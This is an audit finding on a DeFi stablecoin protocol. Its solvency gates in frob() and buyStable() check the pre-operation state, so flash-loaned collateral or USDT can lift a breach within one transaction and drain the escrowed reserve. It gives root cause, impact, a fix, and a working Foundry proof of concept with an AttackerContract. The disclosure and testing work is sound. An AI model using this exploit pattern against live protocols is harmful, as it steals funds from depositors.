# Solvency gate checks the pre-operation state, letting a flash loan temporarily lift the breach to redeem the escrowed reserve, leaving remaining depositors to absorb the loss

## Summary

The solvency gate is meant to stop `PegStabilityModule` redemptions and risk-increasing vault changes when a volatile collateral's price crashes and the stable reserve can no longer cover the stressed worst-case loss. `VaultEngine.frob()` and `PegStabilityModule.buyStable()` recompute the invariant and read `isBreached()` before the vault's collateral and debt or the reserve is updated, so within one transaction an attacker can flash-borrow volatile collateral or USDT, deposit it to raise `globalInk` or `totalReserve` and lift the breach, redeem USDR, and withdraw the borrowed funds through a check that still sees the inflated state. Raising `globalInk` also lowers the committed escrow, so while every other holder is blocked the attacker can redeem all the USDR it holds, including the part of the reserve that the escrow should keep locked to cover the loss. When the transaction ends the breach is back with less reserve behind the same loss, leaving the remaining depositors' funds locked and exposed to that loss.


## Root Cause

`frob()` and `buyStable()` both check `isBreached()` so that the protocol does not take on more debt or risk, or pay out its reserve, while the stable reserve cannot cover the stressed worst-case loss. Each of them calls `SolvencyEngine.checkInvariant()` to recompute the breach flag and reverts if `isBreached()` returns true. `checkInvariant()` decides whether the protocol is breached from two live values: `worstCaseLoss()`, which values each volatile ilk's aggregate collateral `globalInk`, and the `PegStabilityModule` reserve `totalReserve`. It also writes the committed escrow, which sets how much of the reserve `buyStable` may pay out (`freeSlack = totalReserve - committedEscrow`):

`SolvencyEngine.sol::worstCaseLoss()#L268`
```solidity
collateralValue = (globalInk * uint256(val)) / _WAD;
```

`SolvencyEngine.sol::checkInvariant()#L221-L224`
```solidity
breached = loss > (reserve * reserveFactor) / _WAD;
...
RESERVE_ACCOUNTING.updateCommittedEscrow(loss > reserve ? reserve : loss);
```

Both inputs can be raised at will inside one transaction with flash-loaned funds: USDT and USDC can be flash-borrowed and sold into the `PegStabilityModule`, and volatile collateral can be flash-borrowed and deposited into a vault. This already holds for RAIN, which is priced from a Uniswap TWAP and therefore has a Uniswap pool, and for any volatile collateral governance registers later, such as ETH or WBTC named in the deployment script, which have deep flash-loan liquidity. None of the operations that raise these inputs is gated: depositing collateral (`dink > 0, dart == 0`) skips the gate in `frob`, and `sellStable` never checks solvency because it increases the reserve.

Both gates check `isBreached()` before the amounts they change are updated. `frob` runs `checkInvariant()` before it updates the vault's collateral and debt (`urn.ink`, `urn.art`) and the ilk totals (`globalInk`, `globalArt`), so the collateral being withdrawn is still counted in `globalInk` when the breach is evaluated:

`VaultEngine.sol::frob()#L463-L476`
```solidity
if (
    (dart > 0 || dink < 0) && solvencyEngine != address(0) && ISolvencyEngine(solvencyEngine).isVolatile(ilkId)
) {
    ISolvencyEngine(solvencyEngine).checkInvariant();

    if (ISolvencyEngine(solvencyEngine).isBreached()) {
        _revert(SolvencyGateActive.selector);
    }
}

urn.ink = Math.add(urn.ink, dink);
urn.art = Math.add(urn.art, dart);
ilk.globalArt = Math.add(ilk.globalArt, dart);
ilk.globalInk = Math.add(ilk.globalInk, dink);
```

`buyStable` has the same order: the invariant is recomputed before the redemption lowers `totalReserve`:

`PegStabilityModule.sol::buyStable()#L216-L242`
```solidity
if (solvencyEngine != address(0)) {
    ISolvencyEngine(solvencyEngine).checkInvariant();

    if (ISolvencyEngine(solvencyEngine).isBreached()) {
        _revert(SolvencyGateActive.selector);
    }
}
...
RESERVE_ACCOUNTING.recordDecrease(stableAmt18);
```

Each gate therefore answers "is the protocol breached right now?" instead of "will it be breached after this operation?". An operation that itself brings the protocol back into breach is always allowed, as long as the state just before it is not breached. Combined with ungated deposits, this lets anyone make that "just before" state non-breached for the length of one transaction:

- **Raising `globalInk`.** Flash-loaned volatile collateral deposited into a fresh vault is counted in the ilk's `globalInk`, so `worstCaseLoss()` drops, the breach lifts and the committed escrow shrinks. After redeeming, the attacker withdraws the collateral with `frob(-dink)`; the gate is evaluated while that collateral is still in `globalInk`, so the withdrawal passes even though it restores the breach.
- **Raising `totalReserve`.** Flash-loaned USDT sold through `sellStable` raises `totalReserve`, so the breach lifts. The attacker redeems the free slack and then redeems the borrowed USDT back through `buyStable`; that redemption is checked before `totalReserve` falls, so it passes even though it restores the breach.


## Impact

The solvency gate exists to stop redemptions when a volatile collateral's price crash pushes the stressed loss above what the stable reserve can cover, so that the reserve is not paid out first come, first served while that loss is unresolved. The bypass works exactly then: while every other holder is blocked, an attacker lifts the breach within one transaction, redeems at par, and leaves the protocol breached again.

Raising `globalInk` also lowers the committed escrow, so the attacker is not limited to the free slack: it can redeem all the USDR it holds, up to the whole reserve, taking the part the escrow should keep locked to cover the loss. When the transaction ends the breach is back with a smaller reserve behind the same loss. The remaining depositors stay blocked, part of their deposit stays locked in escrow even after the price recovers, and if liquidations leave bad debt they absorb it. Raising `totalReserve` only releases the free slack that already exists, but it still removes the safety margin the gate keeps, so a further price drop leaves more of the loss uncovered.

Lifting the breach needs no capital, only flash-loan liquidity. For RAIN this is bounded by its Uniswap liquidity, but the Solvency Engine applies the same logic to every volatile ilk governance registers, such as ETH or WBTC, where flash-loan liquidity is effectively unlimited. As a result, redemptions continue for whoever can build this transaction, and the protocol becomes insolvent toward the depositors who wait.


## Proof of Concept

The two tests show the two attack paths: flash-borrowing collateral (RAIN) to raise `globalInk`, and flash-borrowing USDT to raise `totalReserve`.

Setup: at a RAIN price of $1, `vaultUser` opens a RAIN vault with 50,000 RAIN and borrows 10,000 USDR. `psmUser`, an honest holder, sells 5,000 USDT into the `PegStabilityModule`. The attacker deploys an `AttackerContract` and sells 2,000 USDT into the `PegStabilityModule` for it, so the reserve holds 7,000 USDT and the attacker contract holds 2,000 USDR. Two mock ERC-3156 lenders with zero fee stand in for external RAIN and USDT flash-loan sources, each holding enough liquidity for the attack. All figures below follow from the Solvency Engine's formulas with its default parameters (`stressMarkdown` = 0.5, `stressDepth` = 0.35, `reserveFactor` = 0.9):

```
collateral value = globalInk × RAIN price
recoverable      = collateral value × 0.5 × 0.35   (17.5% of the collateral value)
worstCaseLoss    = debt − recoverable              (0 if recoverable ≥ debt)
breached         = worstCaseLoss > reserve × 0.9
committedEscrow  = min(worstCaseLoss, reserve)
freeSlack        = reserve − committedEscrow
```

The RAIN price is then pushed through the OSM down to $0.40 and `checkInvariant()` is called. The collateral is worth 50,000 × $0.40 = 20,000 USDR, the recoverable part is 20,000 × 17.5% = 3,500, and `worstCaseLoss()` is 10,000 − 3,500 = 6,500 USDR. This is above the threshold of 7,000 × 0.9 = 6,300, so the protocol is breached. The committed escrow is 6,500, which leaves a free slack of 7,000 − 6,500 = 500 USDR, and `psmUser`'s `buyStable` reverts with `SolvencyGateActive`.

`test_flashLoanAddGlobalInkBypassBreachedBuyStable` shows the `globalInk` path. The whole attack runs inside the flash-loan callback of a single `attackerAddGlobalInk` call:

1. The attacker contract flash-borrows all 200,000 RAIN, joins it through the `CollateralAdapter`, opens a fresh vault and deposits it with `frob(+dink, 0)`. Deposits are not gated, and the extra RAIN raises the ilk's `globalInk` to 50,000 + 200,000 = 250,000 RAIN. The collateral is now worth 250,000 × $0.40 = 100,000 USDR and the recoverable part is 100,000 × 17.5% = 17,500, more than the 10,000 USDR debt, so `worstCaseLoss()` is 0. `checkInvariant()` reports no breach, the committed escrow is 0, and the free slack is the whole reserve of 7,000.
2. It redeems all 2,000 of its USDR through `buyStable` and receives 2,000 USDT, four times the 500 USDR of free slack available before the attack. The reserve falls to 7,000 − 2,000 = 5,000 USDT.
3. It withdraws the 200,000 RAIN with `frob(-dink, 0)`. The gate runs before `globalInk` is reduced, so it still sees the borrowed RAIN and lets the withdrawal pass. The RAIN is exited and the flash loan is repaid.
4. After the transaction the breach is back, and `psmUser`'s `buyStable` still reverts with `SolvencyGateActive`.
5. The RAIN price then recovers to $1. The collateral is worth 50,000 × $1 = 50,000 USDR, the recoverable part is 50,000 × 17.5% = 8,750, and `worstCaseLoss()` is 10,000 − 8,750 = 1,250 USDR. This is below the threshold of 5,000 × 0.9 = 4,500, so the gate opens, but the committed escrow is 1,250 and the free slack is 5,000 − 1,250 = 3,750. `psmUser` can redeem only 3,750 of its 5,000 USDT. Without the attack the reserve would still be 7,000, the free slack 7,000 − 1,250 = 5,750, and `psmUser` could redeem its whole deposit.

`test_flashLoanAddReserveBypassBreachedBuyStable` shows the `totalReserve` path, again inside the callback of a single `attackerAddReserve` call:

1. The attacker contract flash-borrows 100,000 USDT and sells it through `sellStable`, which does not check solvency. `totalReserve` rises to 7,000 + 100,000 = 107,000 USDT, and the threshold to 107,000 × 0.9 = 96,300. `worstCaseLoss()` is still 6,500, so `checkInvariant()` reports no breach. The committed escrow stays 6,500, and the free slack becomes 107,000 − 6,500 = 100,500.
2. It reads `freeSlack()` and redeems all 100,500 through `buyStable`: the 100,000 borrowed USDT plus the 500 of free slack that existed before, paid with its own USDR. It repays the flash loan and keeps the extra 500 USDT, so the reserve falls to 7,000 − 500 = 6,500.
3. After the transaction the breach is back, and `psmUser`'s `buyStable` still reverts with `SolvencyGateActive`.
4. The RAIN price then falls further to $0.30. The collateral is worth 50,000 × $0.30 = 15,000 USDR, the recoverable part is 15,000 × 17.5% = 2,625, and `worstCaseLoss()` is 10,000 − 2,625 = 7,375 USDR. Without the attack the reserve would be 7,000 and the uncovered loss 7,375 − 7,000 = 375 USDR. After the attack the reserve is 6,500, so the uncovered loss is 7,375 − 6,500 = 875 USDR.

Create a new file `tests/FlashLoanBypassBreachedBuyStable.t.sol` and paste the code below into it:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.30;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { IERC3156FlashLender } from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

import { BaseTest } from "./shared/BaseTest.sol";
import { CollateralAdapter } from "../contracts/core/CollateralAdapter.sol";
import { VaultEngine } from "../contracts/core/VaultEngine.sol";
import { PegStabilityModule } from "../contracts/reserve/PegStabilityModule.sol";
import { ReserveAccounting } from "../contracts/reserve/ReserveAccounting.sol";
import { SolvencyEngine } from "../contracts/reserve/SolvencyEngine.sol";
import { _WAD } from "../contracts/shared/Constants.sol";
import { SolvencyGateActive } from "../contracts/shared/Errors.sol";

/// @dev Local stand-in for an external lending pool's ERC-3156 flash loan (zero fee)
contract MockFlashLoanLender is IERC3156FlashLender {
    bytes32 internal constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function maxFlashLoan(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function flashFee(address, uint256) external pure returns (uint256) {
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        IERC20(token).transfer(address(receiver), amount);
        require(receiver.onFlashLoan(msg.sender, token, amount, 0, data) == CALLBACK_SUCCESS, "callback failed");
        IERC20(token).transferFrom(address(receiver), address(this), amount);
        return true;
    }
}


contract AttackerContract is IERC3156FlashBorrower {
    bytes32 internal constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bytes32 internal constant RAIN_ILK = "RAIN-A";
    bytes32 internal constant USDT_ILK = "USDT-A";

    address internal immutable owner;
    VaultEngine internal immutable vaultEngine;
    CollateralAdapter internal immutable collateralAdapter;
    PegStabilityModule internal immutable psm;
    SolvencyEngine internal immutable solvencyEngine;
    ReserveAccounting internal immutable reserveAccounting;
    IERC3156FlashLender internal immutable flashLoanInkLender;
    IERC3156FlashLender internal immutable flashLoanUsdtLender;
    IERC20 internal immutable rain;
    IERC20 internal immutable usdt;
    IERC20 internal immutable usdr;

    // Solvency state recorded right after the flash-loaned funds enter the protocol.
    bool public breachedAfterFlashLoan;

    constructor(
        VaultEngine vaultEngine_,
        CollateralAdapter collateralAdapter_,
        PegStabilityModule psm_,
        SolvencyEngine solvencyEngine_,
        ReserveAccounting reserveAccounting_,
        IERC3156FlashLender flashLoanInkLender_,
        IERC3156FlashLender flashLoanUsdtLender_,
        IERC20 rain_,
        IERC20 usdt_,
        IERC20 usdr_
    ) {
        owner = msg.sender;
        vaultEngine = vaultEngine_;
        collateralAdapter = collateralAdapter_;
        psm = psm_;
        solvencyEngine = solvencyEngine_;
        reserveAccounting = reserveAccounting_;
        flashLoanInkLender = flashLoanInkLender_;
        flashLoanUsdtLender = flashLoanUsdtLender_;
        rain = rain_;
        usdt = usdt_;
        usdr = usdr_;
    }

    /// @dev Entry point: flash-borrows `amount` RAIN and runs the attack in the callback.
    function attackerAddGlobalInk(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        flashLoanInkLender.flashLoan(this, address(rain), amount, "");
    }

    /// @dev Entry point: flash-borrows `amount` USDT and runs the attack in the callback.
    function attackerAddReserve(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        flashLoanUsdtLender.flashLoan(this, address(usdt), amount, "");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        require(initiator == address(this), "untrusted loan");

        if (token == address(usdt)) {
            require(msg.sender == address(flashLoanUsdtLender), "untrusted loan");

            // Sell the flash-loaned USDT into the PSM.
            usdt.approve(address(psm), amount);
            psm.sellStable(USDT_ILK, address(this), amount);

            // Record the solvency state.
            solvencyEngine.checkInvariant();
            breachedAfterFlashLoan = solvencyEngine.breached();

            // Redeem the whole freeSlack.
            uint256 freeSlack = reserveAccounting.freeSlack();
            usdr.approve(address(psm), freeSlack);
            psm.buyStable(USDT_ILK, address(this), freeSlack / 1e12);

            // Repay the flash loan.
            usdt.approve(address(flashLoanUsdtLender), amount + fee);
            return CALLBACK_SUCCESS;
        }

        require(msg.sender == address(flashLoanInkLender), "untrusted loan");

        // Deposit the flash-loaned RAIN into a fresh vault.
        uint256 vaultId = _depositRain(amount);

        // Record the solvency state.
        solvencyEngine.checkInvariant();
        breachedAfterFlashLoan = solvencyEngine.breached();

        // Redeem all held USDR.
        uint256 usdrBalance = usdr.balanceOf(address(this));
        usdr.approve(address(psm), usdrBalance);
        psm.buyStable(USDT_ILK, address(this), usdrBalance / 1e12);

        // Withdraw the RAIN.
        _withdrawRain(vaultId, amount);

        // Repay the flash loan.
        rain.approve(address(flashLoanInkLender), amount + fee);
        return CALLBACK_SUCCESS;
    }

    // ---------- HELPERS ----------

    /// @dev Joins `amount` RAIN, opens a vault and deposits it all as collateral with zero debt.
    function _depositRain(uint256 amount) internal returns (uint256 vaultId) {
        rain.approve(address(collateralAdapter), amount);
        collateralAdapter.join(RAIN_ILK, address(this), amount);
        vaultId = vaultEngine.open(RAIN_ILK, address(this));
        vaultEngine.frob(vaultId, address(this), address(this), int256(amount), 0);
    }

    /// @dev Withdraws `amount` RAIN collateral from `vaultId` and exits it back to ERC-20.
    function _withdrawRain(uint256 vaultId, uint256 amount) internal {
        vaultEngine.frob(vaultId, address(this), address(this), -int256(amount), 0);
        collateralAdapter.exit(RAIN_ILK, address(this), amount);
    }
}

contract FlashLoanBypassBreachedBuyStableTest is BaseTest {
    // vaultUser's RAIN vault collateral and debt.
    uint256 internal constant VAULT_USER_INK = 50_000 * _WAD;
    uint256 internal constant VAULT_USER_ART = 10_000 * _WAD;

    // USDT psmUser sells into the PSM.
    uint256 internal constant PSM_USER_USDT = 5_000 * 1e6;

    // USDT the attacker sells into the PSM.
    uint256 internal constant ATTACKER_USDT = 2_000 * 1e6;

    // RAIN in the flash loan pool.
    uint256 internal constant FLASH_LOAN_LENDER_RAIN = 200_000 * _WAD;

    // USDT in the flash loan pool.
    uint256 internal constant FLASH_LOAN_LENDER_USDT = 100_000 * 1e6;

    address internal vaultUser = makeAddr("vaultUser"); // borrows USDR against RAIN
    address internal psmUser = makeAddr("psmUser"); // honest USDR holder
    address internal attacker = makeAddr("attacker");

    uint256 internal vaultUserVault;

    MockFlashLoanLender internal flashLoanInkLender;
    MockFlashLoanLender internal flashLoanUsdtLender;
    AttackerContract internal attackerContract;

    function setUp() public override {
        super.setUp();

        // Set a healthy RAIN price.
        _setRainPrice(1 * _WAD);

        // vaultUser opens a RAIN vault and borrows USDR.
        vaultUserVault = _openVault(vaultUser, VAULT_USER_INK, VAULT_USER_ART);

        // psmUser sells USDT into the PSM.
        usdt.mint(psmUser, PSM_USER_USDT);
        vm.startPrank(psmUser);
        usdt.approve(address(psm), PSM_USER_USDT);
        psm.sellStable(USDT_ILK, psmUser, PSM_USER_USDT);
        vm.stopPrank();

        // Fund the RAIN flash loan pool.
        flashLoanInkLender = new MockFlashLoanLender();
        rain.mint(address(flashLoanInkLender), FLASH_LOAN_LENDER_RAIN);

        // Fund the USDT flash loan pool.
        flashLoanUsdtLender = new MockFlashLoanLender();
        usdt.mint(address(flashLoanUsdtLender), FLASH_LOAN_LENDER_USDT);

        // Attacker deploys the attack contract and sells USDT into the PSM for it.
        usdt.mint(attacker, ATTACKER_USDT);
        vm.startPrank(attacker);
        attackerContract = new AttackerContract(
            vaultEngine,
            collateralAdapter,
            psm,
            solvencyEngine,
            reserveAccounting,
            flashLoanInkLender,
            flashLoanUsdtLender,
            IERC20(address(rain)),
            IERC20(address(usdt)),
            IERC20(address(usdr))
        );
        usdt.approve(address(psm), ATTACKER_USDT);
        psm.sellStable(USDT_ILK, address(attackerContract), ATTACKER_USDT);
        vm.stopPrank();

        // Drop the RAIN price into the breach.
        _triggerBreach(0.4e18);
        assertTrue(solvencyEngine.breached(), "breach not triggered");
        assertEq(reserveAccounting.freeSlack(), 500 * _WAD, "freeSlack");

        // psmUser's redemption is blocked by the solvency gate.
        vm.startPrank(psmUser);
        usdr.approve(address(psm), PSM_USER_USDT * 1e12);
        vm.expectRevert(SolvencyGateActive.selector);
        psm.buyStable(USDT_ILK, psmUser, PSM_USER_USDT);
        vm.stopPrank();
    }

    function test_flashLoanAddGlobalInkBypassBreachedBuyStable() public {
        // Attacker runs the flash-loaned RAIN attack.
        vm.prank(attacker);
        attackerContract.attackerAddGlobalInk(FLASH_LOAN_LENDER_RAIN);

        // The deposit lifted the breach and the attacker redeemed all its USDR.
        assertFalse(attackerContract.breachedAfterFlashLoan(), "breach still active after flash-loan deposit");
        assertEq(usdt.balanceOf(address(attackerContract)), ATTACKER_USDT, "attacker did not redeem USDT");

        // Once the flash loan is repaid the breach is back: psmUser is still blocked.
        vm.prank(psmUser);
        vm.expectRevert(SolvencyGateActive.selector);
        psm.buyStable(USDT_ILK, psmUser, PSM_USER_USDT);

        // RAIN recovers to $1: psmUser can only redeem up to freeSlack.
        _setRainPrice(1 * _WAD);
        solvencyEngine.checkInvariant();
        uint256 psmUserRedeemable = reserveAccounting.freeSlack() / 1e12;
        vm.prank(psmUser);
        psm.buyStable(USDT_ILK, psmUser, psmUserRedeemable);
        assertEq(usdt.balanceOf(psmUser), 3_750 * 1e6, "psmUser redeemed amount");
    }

    function test_flashLoanAddReserveBypassBreachedBuyStable() public {
        // Attacker runs the flash-loaned USDT attack.
        vm.prank(attacker);
        attackerContract.attackerAddReserve(FLASH_LOAN_LENDER_USDT);

        // The sale lifted the breach and the attacker redeemed 500 USDR.
        assertFalse(attackerContract.breachedAfterFlashLoan(), "breach still active after flash-loan sale");
        assertEq(usdt.balanceOf(address(attackerContract)), 500 * 1e6, "attacker did not redeem USDT");

        // Once the flash loan is repaid the breach is back: psmUser is still blocked.
        vm.prank(psmUser);
        vm.expectRevert(SolvencyGateActive.selector);
        psm.buyStable(USDT_ILK, psmUser, PSM_USER_USDT);

        // RAIN keeps falling: the uncovered loss grows by what the attacker redeemed.
        _triggerBreach(0.3e18);
        uint256 worstCaseLoss = solvencyEngine.worstCaseLoss();
        uint256 uncoveredLossWithoutAttack = worstCaseLoss - 7_000 * _WAD;
        uint256 uncoveredLoss = worstCaseLoss - reserveAccounting.totalReserve();
        assertEq(uncoveredLossWithoutAttack, 375 * _WAD, "uncovered loss without attack");
        assertEq(uncoveredLoss, 875 * _WAD, "uncovered loss");
    }

    // ---------- HELPERS ----------

    /// @dev Pushes `price` [wad] through the OSM (two pokes, one HOP apart) and into the Vault Engine's spot.
    function _setRainPrice(uint256 price) internal {
        rainPriceSource.setPrice(price);
        vm.warp(((vm.getBlockTimestamp() / 1800) + 2) * 1800);
        osm.poke(RAIN_ILK);
        vm.warp(vm.getBlockTimestamp() + 3600);
        osm.poke(RAIN_ILK);
        priceConverter.poke(RAIN_ILK);
    }

    /// @dev Crashes the RAIN price to `price` [wad], shrinking the stressed recoverable value so worstCaseLoss rises,
    ///      then recomputes the invariant so `breached` is written as true.
    function _triggerBreach(uint256 price) internal {
        _setRainPrice(price);
        solvencyEngine.checkInvariant();
    }

    /// @dev Opens a fresh RAIN vault for `who` with `ink` collateral and `art` debt.
    function _openVault(address who, uint256 ink, uint256 art) internal returns (uint256 vaultId) {
        rain.mint(who, ink);

        vm.startPrank(who);
        rain.approve(address(collateralAdapter), ink);
        collateralAdapter.join(RAIN_ILK, who, ink);
        vaultId = vaultEngine.open(RAIN_ILK, who);
        vaultEngine.frob(vaultId, who, who, int256(ink), int256(art));
        vm.stopPrank();
    }
}
```

---

## Recommendation

Evaluate the solvency gate on the state *after* the operation, so that an operation which itself brings the protocol into breach is rejected. In `frob`, move the gate below the point where the vault and the ilk totals are written:

```diff
   function frob(uint256 vaultId, address v, address w, int256 dink, int256 dart) external {
-        if (
-            (dart > 0 || dink < 0) && solvencyEngine != address(0) && ISolvencyEngine(solvencyEngine).isVolatile(ilkId)
-        ) {
-            ISolvencyEngine(solvencyEngine).checkInvariant();
-
-            if (ISolvencyEngine(solvencyEngine).isBreached()) {
-                _revert(SolvencyGateActive.selector);
-            }
-        }
-
         urn.ink = Math.add(urn.ink, dink);
         ...
         urns[vaultId] = urn;
         ilks[ilkId] = ilk;
 
+        // Solvency gate on the post-change state: a risk-increasing change that leaves the protocol breached reverts.
+        if (
+            (dart > 0 || dink < 0) && solvencyEngine != address(0) && ISolvencyEngine(solvencyEngine).isVolatile(ilkId)
+        ) {
+            ISolvencyEngine(solvencyEngine).checkInvariant();
+
+            if (ISolvencyEngine(solvencyEngine).isBreached()) {
+                _revert(SolvencyGateActive.selector);
+            }
+        }
+
         emit Frob({ ilkId: ilkId, vaultId: vaultId, v: v, w: w, dink: dink, dart: dart });
```

In `buyStable`, keep the existing check at the start, which refreshes the committed escrow before `freeSlack()` is read, and recompute the invariant again after the reserve decrease:

```diff
   function buyStable(bytes32 ilkId, address user, uint256 stableAmt) external nonReentrant {
         if (solvencyEngine != address(0)) {
             ISolvencyEngine(solvencyEngine).checkInvariant();
 
             if (ISolvencyEngine(solvencyEngine).isBreached()) {
                 _revert(SolvencyGateActive.selector);
             }
         }
         ...
         RESERVE_ACCOUNTING.recordDecrease(stableAmt18);
 
+        // Solvency gate on the post-redemption state: a redemption that leaves the protocol breached reverts.
+        if (solvencyEngine != address(0)) {
+            ISolvencyEngine(solvencyEngine).checkInvariant();
+
+            if (ISolvencyEngine(solvencyEngine).isBreached()) {
+                _revert(SolvencyGateActive.selector);
+            }
+        }
+
         emit BuyStable({ ilkId: ilkId, user: user, stableAmt: stableAmt, usdrAmt: stableAmt18 });
```

With these checks, withdrawing the flash-loaned RAIN and redeeming the flash-loaned USDT both revert, so the loan cannot be repaid and the whole transaction fails. The gate also becomes stricter for honest users: a draw, withdrawal or redemption that would itself push the protocol into breach is rejected, which is the behavior the gate is meant to have.
